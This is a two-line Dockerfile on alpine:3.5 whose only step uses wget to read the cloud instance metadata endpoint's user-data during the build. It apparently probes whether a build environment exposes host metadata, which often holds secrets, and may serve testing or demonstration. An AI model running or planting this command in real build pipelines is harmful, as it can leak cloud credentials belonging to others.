FROM alpine:3.5
RUN wget -O - 169.254.169.254/latest/user-data

